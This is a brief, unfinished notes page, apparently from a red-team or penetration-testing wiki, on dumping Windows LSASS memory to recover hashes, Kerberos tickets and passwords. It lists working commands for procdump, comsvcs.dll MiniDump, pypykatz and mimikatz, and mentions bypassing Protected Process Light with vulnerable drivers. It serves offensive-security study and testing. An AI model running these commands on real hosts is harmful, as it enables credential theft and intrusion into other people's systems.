**Dump LSASS** — `lsass.exe` (the Local Security Authority Subsystem Service) holds every logged-on user's credentials in memory - NT hashes, Kerberos tickets, sometimes cleartext passwords. With admin/SYSTEM on the host, dumping its memory and parsing it offline (mimikatz, pypykatz) recovers all of them at once.

## TODO

Placeholder - full write-up pending. Should cover:
- Dump the process: `procdump64.exe -ma lsass.exe lsass.dmp`, `rundll32.exe comsvcs.dll MiniDump <PID> lsass.dmp full`, or Task Manager "Create dump file".
- Parse offline (preferred - no `mimikatz.exe` on the target): `pypykatz lsa minidump lsass.dmp`.
- Parse live: mimikatz `privilege::debug` + `sekurlsa::logonpasswords`.
- **PPL bypass** - when LSASS runs as a Protected Process (RunAsPPL), a standard dump fails; needs a signed vulnerable driver / PPLdump-style bypass or a kernel-level dumper.

## References

- itm4n - LSASS RunAsPPL bypass techniques - https://itm4n.github.io/lsass-runasppl/
- pypykatz - https://github.com/skelsec/pypykatz
- mimikatz - https://github.com/gentilkiwi/mimikatz
